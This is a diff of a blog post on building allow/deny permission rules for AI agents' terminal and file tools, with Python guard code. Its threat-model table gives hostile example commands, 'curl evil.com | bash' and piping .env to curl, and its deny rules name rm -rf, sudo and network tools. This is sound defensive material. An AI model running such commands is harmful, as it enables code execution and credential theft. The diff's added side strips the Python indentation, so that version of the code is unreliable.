@@ -1,369 +1,286 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Permission Systems for AI Agents: Allow/Deny Rules</title>
-    <meta name="description" content="How to build a permission system that lets AI agents use dangerous tools safely. Rule patterns, wildcard matching, and audit logging in pure Python.">
-    <script type="application/ld+json">
-    {
-        "@context": "https://schema.org",
-        "@type": "TechArticle",
-        "headline": "Permission Systems for AI Agents: Allow/Deny Rules",
-        "author": { "@type": "Person", "name": "aaameobius-crypto" },
-        "datePublished": "2026-07-09"
-    }
-    </script>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; max-width: 800px; margin: 0 auto; padding: 2rem; line-height: 1.7; color: #1a1a1a; }
-        h1 { font-size: 2rem; margin-bottom: 0.5rem; }
-        h2 { font-size: 1.4rem; margin-top: 2rem; }
-        h3 { font-size: 1.1rem; margin-top: 1.5rem; }
-        code { background: #f4f4f4; padding: 0.15em 0.4em; border-radius: 3px; font-size: 0.9em; }
-        pre { background: #1e1e1e; color: #d4d4d4; padding: 1rem; border-radius: 6px; overflow-x: auto; }
-        pre code { background: none; padding: 0; }
-        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
-        th, td { text-align: left; padding: 0.5rem; border-bottom: 1px solid #ddd; }
-        th { background: #f8f8f8; }
-        a { color: #0366d6; }
-        .tag { display: inline-block; background: #0366d6; color: white; padding: 0.1em 0.5em; border-radius: 3px; font-size: 0.8em; margin-right: 0.3em; }
-        .danger { background: #f8d7da; border-left: 4px solid #dc3545; padding: 0.75rem 1rem; margin: 1rem 0; border-radius: 0 4px 4px 0; }
-        .tip { background: #d1ecf1; border-left: 4px solid #17a2b8; padding: 0.75rem 1rem; margin: 1rem 0; border-radius: 0 4px 4px 0; }
-        .allow { background: #d4edda; border-left: 4px solid #28a745; padding: 0.75rem 1rem; margin: 1rem 0; border-radius: 0 4px 4px 0; }
-    </style>
+<head>><meta charset="UTF-8">><meta name="viewport" content="width=device-width, initial-scale=1.0">><title>Permission Systems for AI Agents: Allow/Deny Rules</title>><meta name="description" content="How to build a permission system that lets AI agents use dangerous tools safely. Rule patterns, wildcard matching, and audit logging in pure Python.">><script type="application/ld+json">>{
+ "@context": "https://schema.org",
+ "@type": "TechArticle",
+ "headline": "Permission Systems for AI Agents: Allow/Deny Rules",
+ "author": { "@type": "Person", "name": "aaameobius-crypto" },
+ "datePublished": "2026-07-09"
+ }
+ </script>><style>>body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; max-width: 800px; margin: 0 auto; padding: 2rem; line-height: 1.7; color: #1a1a1a; }
+ h1 { font-size: 2rem; margin-bottom: 0.5rem; }
+ h2 { font-size: 1.4rem; margin-top: 2rem; }
+ h3 { font-size: 1.1rem; margin-top: 1.5rem; }
+ code { background: #f4f4f4; padding: 0.15em 0.4em; border-radius: 3px; font-size: 0.9em; }
+ pre { background: #1e1e1e; color: #d4d4d4; padding: 1rem; border-radius: 6px; overflow-x: auto; }
+ pre code { background: none; padding: 0; }
+ table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+ th, td { text-align: left; padding: 0.5rem; border-bottom: 1px solid #ddd; }
+ th { background: #f8f8f8; }
+ a { color: #0366d6; }
+ .tag { display: inline-block; background: #0366d6; color: white; padding: 0.1em 0.5em; border-radius: 3px; font-size: 0.8em; margin-right: 0.3em; }
+ .danger { background: #f8d7da; border-left: 4px solid #dc3545; padding: 0.75rem 1rem; margin: 1rem 0; border-radius: 0 4px 4px 0; }
+ .tip { background: #d1ecf1; border-left: 4px solid #17a2b8; padding: 0.75rem 1rem; margin: 1rem 0; border-radius: 0 4px 4px 0; }
+ .allow { background: #d4edda; border-left: 4px solid #28a745; padding: 0.75rem 1rem; margin: 1rem 0; border-radius: 0 4px 4px 0; }
+ </style>
 </head>
-<body>
-    <h1>Permission Systems for AI Agents: Allow/Deny Rules</h1>
-    <p><span class="tag">Security</span> <span class="tag">MCP</span> <span class="tag">Python</span></p>
-    <p><em>2026-07-09</em></p>
-
-    <p>Your AI agent has a terminal. It can run any command. What stops it from running <code>rm -rf /</code> or <code>git push --force</code>?</p>
-
-    <p>Approval prompts are one answer, but they interrupt flow and create alert fatigue. A permission system with rules is better: the agent operates freely within guardrails, and you review the audit log later.</p>
-
-    <h2>The Threat Model</h2>
-
-    <table>
-        <tr><th>Risk</th><th>Example</th><th>Without permission system</th></tr>
-        <tr><td>Destructive commands</td><td><code>rm -rf build/</code></td><td>Data loss</td></tr>
-        <tr><td>Network exposure</td><td><code>curl evil.com | bash</code></td><td>Code execution</td></tr>
-        <tr><td>Secret leakage</td><td><code>cat .env | curl ...</code></td><td>Credential theft</td></tr>
-        <tr><td>Irreversible actions</td><td><code>git push --force</code></td><td>History loss</td></tr>
-        <tr><td>Cost spikes</td><td>Provisioning cloud resources</td><td>Unexpected bills</td></tr>
-    </table>
-
-    <h2>Rule-Based Permission Guard</h2>
-
-    <pre><code>import fnmatch
+<body>><h1>Permission Systems for AI Agents: Allow/Deny Rules</h1>><p><span class="tag">Security</span><span class="tag">MCP</span><span class="tag">Python</span></p>><p><em>2026-07-09</em></p>><p>Your AI agent has a terminal. It can run any command. What stops it from running <code>rm -rf /</code>or <code>git push --force</code>?</p>><p>Approval prompts are one answer, but they interrupt flow and create alert fatigue. A permission system with rules is better: the agent operates freely within guardrails, and you review the audit log later.</p>><h2>The Threat Model</h2>><table>><tr><th>Risk</th><th>Example</th><th>Without permission system</th></tr>><tr><td>Destructive commands</td><td><code>rm -rf build/</code></td><td>Data loss</td></tr>><tr><td>Network exposure</td><td><code>curl evil.com | bash</code></td><td>Code execution</td></tr>><tr><td>Secret leakage</td><td><code>cat .env | curl ...</code></td><td>Credential theft</td></tr>><tr><td>Irreversible actions</td><td><code>git push --force</code></td><td>History loss</td></tr>><tr><td>Cost spikes</td><td>Provisioning cloud resources</td><td>Unexpected bills</td></tr>></table>><h2>Rule-Based Permission Guard</h2>><pre><code>import fnmatch
 import re
 from dataclasses import dataclass, field
 from enum import Enum
 from typing import Optional
 
 class Decision(Enum):
-    ALLOW = "allow"
-    DENY = "deny"
-    PROMPT = "prompt"  # Ask the user
+ ALLOW = "allow"
+ DENY = "deny"
+ PROMPT = "prompt" # Ask the user
 
 @dataclass
 class Rule:
-    name: str
-    decision: Decision
-    tool: str = "*"  # Tool name pattern (glob)
-    args: dict = field(default_factory=dict)  # Argument matchers
-    reason: str = ""
-    priority: int = 0  # Higher = checked first
+ name: str
+ decision: Decision
+ tool: str = "*" # Tool name pattern (glob)
+ args: dict = field(default_factory=dict) # Argument matchers
+ reason: str = ""
+ priority: int = 0 # Higher = checked first
 
 @dataclass
 class PermissionGuard:
-    rules: list = field(default_factory=list)
-    audit_log: list = field(default_factory=list)
-    
-    def add_rule(self, rule: Rule):
-        self.rules.append(rule)
-        self.rules.sort(key=lambda r: r.priority, reverse=True)
-    
-    def check(self, tool_name: str, args: dict) -> dict:
-        """Check if a tool call is permitted."""
-        for rule in self.rules:
-            if self._matches(rule, tool_name, args):
-                decision = rule.decision
-                self._log(tool_name, args, decision, rule.name)
-                return {
-                    "decision": decision.value,
-                    "rule": rule.name,
-                    "reason": rule.reason,
-                    "tool": tool_name,
-                    "args": args
-                }
-        
-        # Default: prompt for unknown
-        self._log(tool_name, args, Decision.PROMPT, "default")
-        return {
-            "decision": Decision.PROMPT.value,
-            "rule": "default",
-            "reason": "No matching rule",
-            "tool": tool_name,
-            "args": args
-        }
-    
-    def _matches(self, rule: Rule, tool_name: str, args: dict) -> bool:
-        """Check if a rule matches the given tool call."""
-        # Tool name match (glob)
-        if not fnmatch.fnmatch(tool_name, rule.tool):
-            return False
-        
-        # Argument matchers
-        for key, matcher in rule.args.items():
-            if key not in args:
-                return False
-            
-            value = str(args[key])
-            
-            if isinstance(matcher, str):
-                # Glob match for strings
-                if matcher.startswith("regex:"):
-                    pattern = matcher[6:]
-                    if not re.search(pattern, value):
-                        return False
-                elif not fnmatch.fnmatch(value, matcher):
-                    return False
-            elif callable(matcher):
-                if not matcher(value):
-                    return False
-        
-        return True
-    
-    def _log(self, tool: str, args: dict, decision: Decision, rule: str):
-        from datetime import datetime
-        self.audit_log.append({
-            "timestamp": datetime.now().isoformat(),
-            "tool": tool,
-            "args": str(args)[:200],  # truncate
-            "decision": decision.value,
-            "rule": rule
-        })</code></pre>
-
-    <h2>Rule Patterns</h2>
-
-    <h3>Pattern 1: Safe Read Operations (Always Allow)</h3>
-
-    <div class="allow">
-    <pre><code>guard.add_rule(Rule(
-    name="allow_reads",
-    decision=Decision.ALLOW,
-    tool="read_file",
-    priority=100,
-    reason="File reads are safe"
+ rules: list = field(default_factory=list)
+ audit_log: list = field(default_factory=list)
+ 
+ def add_rule(self, rule: Rule):
+ self.rules.append(rule)
+ self.rules.sort(key=lambda r: r.priority, reverse=True)
+ 
+ def check(self, tool_name: str, args: dict) ->dict:
+ """Check if a tool call is permitted."""
+ for rule in self.rules:
+ if self._matches(rule, tool_name, args):
+ decision = rule.decision
+ self._log(tool_name, args, decision, rule.name)
+ return {
+ "decision": decision.value,
+ "rule": rule.name,
+ "reason": rule.reason,
+ "tool": tool_name,
+ "args": args
+ }
+ 
+ # Default: prompt for unknown
+ self._log(tool_name, args, Decision.PROMPT, "default")
+ return {
+ "decision": Decision.PROMPT.value,
+ "rule": "default",
+ "reason": "No matching rule",
+ "tool": tool_name,
+ "args": args
+ }
+ 
+ def _matches(self, rule: Rule, tool_name: str, args: dict) ->bool:
+ """Check if a rule matches the given tool call."""
+ # Tool name match (glob)
+ if not fnmatch.fnmatch(tool_name, rule.tool):
+ return False
+ 
+ # Argument matchers
+ for key, matcher in rule.args.items():
+ if key not in args:
+ return False
+ 
+ value = str(args[key])
+ 
+ if isinstance(matcher, str):
+ # Glob match for strings
+ if matcher.startswith("regex:"):
+ pattern = matcher[6:]
+ if not re.search(pattern, value):
+ return False
+ elif not fnmatch.fnmatch(value, matcher):
+ return False
+ elif callable(matcher):
+ if not matcher(value):
+ return False
+ 
+ return True
+ 
+ def _log(self, tool: str, args: dict, decision: Decision, rule: str):
+ from datetime import datetime
+ self.audit_log.append({
+ "timestamp": datetime.now().isoformat(),
+ "tool": tool,
+ "args": str(args)[:200], # truncate
+ "decision": decision.value,
+ "rule": rule
+ })</code></pre>><h2>Rule Patterns</h2>><h3>Pattern 1: Safe Read Operations (Always Allow)</h3>><div class="allow">><pre><code>guard.add_rule(Rule(
+ name="allow_reads",
+ decision=Decision.ALLOW,
+ tool="read_file",
+ priority=100,
+ reason="File reads are safe"
 ))
 
 guard.add_rule(Rule(
-    name="allow_safe_terminal",
-    decision=Decision.ALLOW,
-    tool="terminal",
-    args={"command": "ls*"},  # Only ls commands
-    priority=100,
-    reason="Directory listing is safe"
+ name="allow_safe_terminal",
+ decision=Decision.ALLOW,
+ tool="terminal",
+ args={"command": "ls*"}, # Only ls commands
+ priority=100,
+ reason="Directory listing is safe"
 ))
 
 guard.add_rule(Rule(
-    name="allow_git_status",
-    decision=Decision.ALLOW,
-    tool="terminal",
-    args={"command": "git status*"},
-    priority=100,
-    reason="Git status is read-only"
-))</code></pre>
-    </div>
-
-    <h3>Pattern 2: Destructive Operations (Deny)</h3>
-
-    <div class="danger">
-    <pre><code>guard.add_rule(Rule(
-    name="deny_rm_rf",
-    decision=Decision.DENY,
-    tool="terminal",
-    args={"command": "regex:.*rm\\s+-rf.*"},
-    priority=200,
-    reason="Recursive force delete is blocked"
+ name="allow_git_status",
+ decision=Decision.ALLOW,
+ tool="terminal",
+ args={"command": "git status*"},
+ priority=100,
+ reason="Git status is read-only"
+))</code></pre>></div>><h3>Pattern 2: Destructive Operations (Deny)</h3>><div class="danger">><pre><code>guard.add_rule(Rule(
+ name="deny_rm_rf",
+ decision=Decision.DENY,
+ tool="terminal",
+ args={"command": "regex:.*rm\\s+-rf.*"},
+ priority=200,
+ reason="Recursive force delete is blocked"
 ))
 
 guard.add_rule(Rule(
-    name="deny_force_push",
-    decision=Decision.DENY,
-    tool="terminal",
-    args={"command": "regex:.*git\\s+push.*--force.*"},
-    priority=200,
-    reason="Force push can destroy history"
+ name="deny_force_push",
+ decision=Decision.DENY,
+ tool="terminal",
+ args={"command": "regex:.*git\\s+push.*--force.*"},
+ priority=200,
+ reason="Force push can destroy history"
 ))
 
 guard.add_rule(Rule(
-    name="deny_env_access",
-    decision=Decision.DENY,
-    tool="read_file",
-    args={"path": "regex:.*\\.env.*"},
-    priority=200,
-    reason="Environment files contain secrets"
-))</code></pre>
-    </div>
-
-    <h3>Pattern 3: Network Operations (Prompt)</h3>
-
-    <pre><code>guard.add_rule(Rule(
-    name="prompt_network",
-    decision=Decision.PROMPT,
-    tool="terminal",
-    args={"command": "regex:.*(curl|wget|ssh|scp).*"},
-    priority=150,
-    reason="Network operations require approval"
+ name="deny_env_access",
+ decision=Decision.DENY,
+ tool="read_file",
+ args={"path": "regex:.*\\.env.*"},
+ priority=200,
+ reason="Environment files contain secrets"
+))</code></pre>></div>><h3>Pattern 3: Network Operations (Prompt)</h3>><pre><code>guard.add_rule(Rule(
+ name="prompt_network",
+ decision=Decision.PROMPT,
+ tool="terminal",
+ args={"command": "regex:.*(curl|wget|ssh|scp).*"},
+ priority=150,
+ reason="Network operations require approval"
 ))
 
 guard.add_rule(Rule(
-    name="prompt_package_install",
-    decision=Decision.PROMPT,
-    tool="terminal",
-    args={"command": "regex:.*(pip\\s+install|npm\\s+install|apt).*"},
-    priority=150,
-    reason="Package installation requires approval"
-))</code></pre>
-
-    <h3>Pattern 4: Working Directory Restriction</h3>
-
-    <pre><code>guard.add_rule(Rule(
-    name="deny_outside_project",
-    decision=Decision.DENY,
-    tool="terminal",
-    args={"command": "regex:.*\\s+/(?!home/user/project).*"},
-    priority=180,
-    reason="Operations outside project directory blocked"
+ name="prompt_package_install",
+ decision=Decision.PROMPT,
+ tool="terminal",
+ args={"command": "regex:.*(pip\\s+install|npm\\s+install|apt).*"},
+ priority=150,
+ reason="Package installation requires approval"
+))</code></pre>><h3>Pattern 4: Working Directory Restriction</h3>><pre><code>guard.add_rule(Rule(
+ name="deny_outside_project",
+ decision=Decision.DENY,
+ tool="terminal",
+ args={"command": "regex:.*\\s+/(?!home/user/project).*"},
+ priority=180,
+ reason="Operations outside project directory blocked"
 ))
 
 # More specific: block writes to /etc, /usr, /boot
 guard.add_rule(Rule(
-    name="deny_system_dirs",
-    decision=Decision.DENY,
-    tool="terminal",
-    args={"command": "regex:.*(>/|\\|tee\\s+)/(etc|usr|boot|sys|proc).*"},
-    priority=190,
-    reason="System directory access blocked"
-))</code></pre>
-
-    <h3>Pattern 5: Resource Limits</h3>
-
-    <pre><code>guard.add_rule(Rule(
-    name="deny_large_writes",
-    decision=Decision.DENY,
-    tool="write_file",
-    args={"content": lambda v: len(v) > 1_000_000},  # 1MB limit
-    priority=170,
-    reason="Files over 1MB require manual creation"
-))</code></pre>
-
-    <h2>Combining Rules into a Policy</h2>
-
-    <pre><code>guard = PermissionGuard()
+ name="deny_system_dirs",
+ decision=Decision.DENY,
+ tool="terminal",
+ args={"command": "regex:.*(>/|\\|tee\\s+)/(etc|usr|boot|sys|proc).*"},
+ priority=190,
+ reason="System directory access blocked"
+))</code></pre>><h3>Pattern 5: Resource Limits</h3>><pre><code>guard.add_rule(Rule(
+ name="deny_large_writes",
+ decision=Decision.DENY,
+ tool="write_file",
+ args={"content": lambda v: len(v) >1_000_000}, # 1MB limit
+ priority=170,
+ reason="Files over 1MB require manual creation"
+))</code></pre>><h2>Combining Rules into a Policy</h2>><pre><code>guard = PermissionGuard()
 
 # === DENY RULES (highest priority) ===
 guard.add_rule(Rule("deny_rm_rf", Decision.DENY, "terminal", 
-    {"command": "regex:.*rm\\s+-rf.*"}, "Blocked: destructive", 200))
+ {"command": "regex:.*rm\\s+-rf.*"}, "Blocked: destructive", 200))
 guard.add_rule(Rule("deny_force_push", Decision.DENY, "terminal",
-    {"command": "regex:.*git\\s+push.*--force.*"}, "Blocked: history loss", 200))
+ {"command": "regex:.*git\\s+push.*--force.*"}, "Blocked: history loss", 200))
 guard.add_rule(Rule("deny_env", Decision.DENY, "read_file",
-    {"path": "regex:.*\\.env.*"}, "Blocked: secrets", 200))
+ {"path": "regex:.*\\.env.*"}, "Blocked: secrets", 200))
 guard.add_rule(Rule("deny_sudo", Decision.DENY, "terminal",
-    {"command": "regex:.*sudo.*"}, "Blocked: privilege escalation", 200))
+ {"command": "regex:.*sudo.*"}, "Blocked: privilege escalation", 200))
 
 # === PROMPT RULES (medium priority) ===
 guard.add_rule(Rule("prompt_network", Decision.PROMPT, "terminal",
-    {"command": "regex:.*(curl|wget|http).*"}, "Network needs approval", 150))
+ {"command": "regex:.*(curl|wget|http).*"}, "Network needs approval", 150))
 guard.add_rule(Rule("prompt_install", Decision.PROMPT, "terminal",
-    {"command": "regex:.*(pip|npm|apt).*"}, "Installs need approval", 150))
+ {"command": "regex:.*(pip|npm|apt).*"}, "Installs need approval", 150))
 
 # === ALLOW RULES (lower priority) ===
 guard.add_rule(Rule("allow_reads", Decision.ALLOW, "read_file", priority=100))
 guard.add_rule(Rule("allow_search", Decision.ALLOW, "search_files", priority=100))
 guard.add_rule(Rule("allow_ls", Decision.ALLOW, "terminal",
-    {"command": "ls*"}, "Listing is safe", 100))
+ {"command": "ls*"}, "Listing is safe", 100))
 guard.add_rule(Rule("allow_git_read", Decision.ALLOW, "terminal",
-    {"command": "regex:git\\s+(status|log|diff|branch).*"}, 
-    "Git reads are safe", 100))
+ {"command": "regex:git\\s+(status|log|diff|branch).*"}, 
+ "Git reads are safe", 100))
 
 # Default: prompt for anything unmatched
-# (handled by the guard's default behavior)</code></pre>
-
-    <h2>Integration Example</h2>
-
-    <pre><code># In your agent loop, before executing any tool:
+# (handled by the guard's default behavior)</code></pre>><h2>Integration Example</h2>><pre><code># In your agent loop, before executing any tool:
 def execute_tool(tool_name, args, guard):
-    permission = guard.check(tool_name, args)
-    
-    if permission["decision"] == "deny":
-        return f"[BLOCKED] {permission['reason']} (rule: {permission['rule']})"
-    
-    if permission["decision"] == "prompt":
-        approved = ask_user(
-            f"Allow {tool_name}({args})? Reason: {permission['reason']}"
-        )
-        if not approved:
-            return "[CANCELLED] User denied tool call"
-    
-    # Execute the tool
-    result = actual_tool_handler(tool_name, args)
-    return result
+ permission = guard.check(tool_name, args)
+ 
+ if permission["decision"] == "deny":
+ return f"[BLOCKED] {permission['reason']} (rule: {permission['rule']})"
+ 
+ if permission["decision"] == "prompt":
+ approved = ask_user(
+ f"Allow {tool_name}({args})? Reason: {permission['reason']}"
+ )
+ if not approved:
+ return "[CANCELLED] User denied tool call"
+ 
+ # Execute the tool
+ result = actual_tool_handler(tool_name, args)
+ return result
 
 # The guard automatically logs every decision
 # Review the audit log:
 for entry in guard.audit_log[-20:]:
-    print(f"{entry['timestamp']} | {entry['decision']:8} | "
-          f"{entry['tool']:15} | {entry['rule']}")</code></pre>
-
-    <h2>Sample Audit Log</h2>
-
-    <pre><code>2026-07-09T10:15:03 | allow    | read_file       | allow_reads
-2026-07-09T10:15:05 | allow    | search_files    | allow_search
-2026-07-09T10:15:08 | allow    | terminal        | allow_git_read
-2026-07-09T10:15:12 | prompt   | terminal        | prompt_install
-2026-07-09T10:15:12 | allow    | terminal        | prompt_install  (user approved)
-2026-07-09T10:15:20 | deny     | terminal        | deny_rm_rf
-2026-07-09T10:15:20 | allow    | terminal        | allow_ls  (agent tried alt approach)
-2026-07-09T10:15:25 | allow    | patch           | default (prompted, auto-approved)
-2026-07-09T10:15:30 | deny     | terminal        | deny_force_push</code></pre>
-
-    <div class="tip">Review the audit log weekly. If the same prompt appears 50 times, add an explicit ALLOW or DENY rule to automate that decision.</div>
-
-    <h2>Advanced: Conditional Rules</h2>
-
-    <pre><code># Allow git push only to feature branches
+ print(f"{entry['timestamp']} | {entry['decision']:8} | "
+ f"{entry['tool']:15} | {entry['rule']}")</code></pre>><h2>Sample Audit Log</h2>><pre><code>2026-07-09T10:15:03 | allow | read_file | allow_reads
+2026-07-09T10:15:05 | allow | search_files | allow_search
+2026-07-09T10:15:08 | allow | terminal | allow_git_read
+2026-07-09T10:15:12 | prompt | terminal | prompt_install
+2026-07-09T10:15:12 | allow | terminal | prompt_install (user approved)
+2026-07-09T10:15:20 | deny | terminal | deny_rm_rf
+2026-07-09T10:15:20 | allow | terminal | allow_ls (agent tried alt approach)
+2026-07-09T10:15:25 | allow | patch | default (prompted, auto-approved)
+2026-07-09T10:15:30 | deny | terminal | deny_force_push</code></pre>><div class="tip">Review the audit log weekly. If the same prompt appears 50 times, add an explicit ALLOW or DENY rule to automate that decision.</div>><h2>Advanced: Conditional Rules</h2>><pre><code># Allow git push only to feature branches
 guard.add_rule(Rule(
-    name="allow_feature_push",
-    decision=Decision.ALLOW,
-    tool="terminal",
-    args={
-        "command": "regex:git\\s+push\\s+origin\\s+feat/.*"
-    },
-    priority=160,
-    reason="Feature branch pushes are safe"
+ name="allow_feature_push",
+ decision=Decision.ALLOW,
+ tool="terminal",
+ args={
+ "command": "regex:git\\s+push\\s+origin\\s+feat/.*"
+ },
+ priority=160,
+ reason="Feature branch pushes are safe"
 ))
 
 # Deny pushes to main/master
 guard.add_rule(Rule(
-    name="deny_main_push",
-    decision=Decision.DENY,
-    tool="terminal",
-    args={
-        "command": "regex:git\\s+push\\s+origin\\s+(main|master).*"
-    },
-    priority=210,  # Higher than feature push
-    reason="Direct pushes to main are blocked"
-))</code></pre>
-
-    <h2>Install</h2>
-
-    <pre><code>pip install mcp-permission-guard</code></pre>
-
-    <p>Source: <a href="https://github.com/aaameobius-crypto/darkbot-ai-templates/tree/main/mcp-permission-guard">mcp-permission-guard on GitHub</a></p>
-
-    <hr>
-    <p><em>168 production-ready Python templates. Zero dependencies. <a href="https://github.com/aaameobius-crypto/darkbot-ai-templates">View on GitHub</a></em></p>
+ name="deny_main_push",
+ decision=Decision.DENY,
+ tool="terminal",
+ args={
+ "command": "regex:git\\s+push\\s+origin\\s+(main|master).*"
+ },
+ priority=210, # Higher than feature push
+ reason="Direct pushes to main are blocked"
+))</code></pre>><h2>Install</h2>><pre><code>pip install mcp-permission-guard</code></pre>><p>Source: <a href="https://github.com/aaameobius-crypto/darkbot-ai-templates/tree/main/mcp-permission-guard">mcp-permission-guard on GitHub</a></p>><hr>><p><em>168 production-ready Python templates. Zero dependencies. <a href="https://github.com/aaameobius-crypto/darkbot-ai-templates">View on GitHub</a></em></p>
 </body>
 </html>
